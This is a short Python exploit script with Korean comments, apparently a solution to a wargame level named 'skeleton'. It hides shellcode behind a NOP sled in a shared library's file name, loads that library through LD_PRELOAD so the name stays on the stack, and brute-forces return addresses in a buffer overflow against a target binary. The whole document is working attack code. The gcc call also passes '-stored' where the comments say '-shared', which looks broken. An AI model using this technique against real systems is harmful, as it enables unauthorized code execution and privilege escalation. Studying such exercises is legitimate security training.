# fPIC : 오브젝트 파일을 만들 때 함수나 변수 등과 같은 symbol들이 어느 위치에 위치하더라도 동작하도록 하는 옵션

# shared : 공유라이브러리를 우선적으로 링크하도록 하는 옵션

# LD_PRELOAD : 환경변수 중 LD_PRELOAD는 지정한 공유라이브러리를 우선적으로 프로그램에 동적 링킹, 메모리로 로딩을 해주는 특성이 있어서 이것을 이용.
# 해당 공유라이브러리의 내용을 실행시키는 것이 아닌 해당 공유라이브러리의 이름이 취약 파일의 스택에 남아 있는 점을 활용.

# void shell(){};

# export LD_PRELOAD="`python -c 'print "/home/skeleton/"+"\x90"*100+"\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`"

# gcc sha.c -fPIC -shared -o `python -c 'print "\x90"*100+"\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"'`


import os, sys

TARGET=os.getcwd()+"/"+sys.argv[1]

file="shared.c"
output="\x90"*100+"\x68\xf9\xbf\x0f\x40\x68\xe0\x91\x03\x40\xb8\xe0\x8a\x05\x40\x50\xc3"
prompt="gcc "+file+" -fPIC -stored -o "+output

fp=open(file,'w')
fp.write("void shell(){};")

os.system(prompt)

os.putenv("LD_PRELOAD",os.getcwd()+"/"+output)

for h in range(0xff,0x00,-1):
	for l in range(0x00,0x100,50):
		payload="a"*44+chr(l)+chr(h)+"\xff\xbf"
		pid = os.fork()
		if pid==0:
			os.execl(TARGET,TARGET,payload)
		else:
			os.waitpid(pid,0)

fp.close()








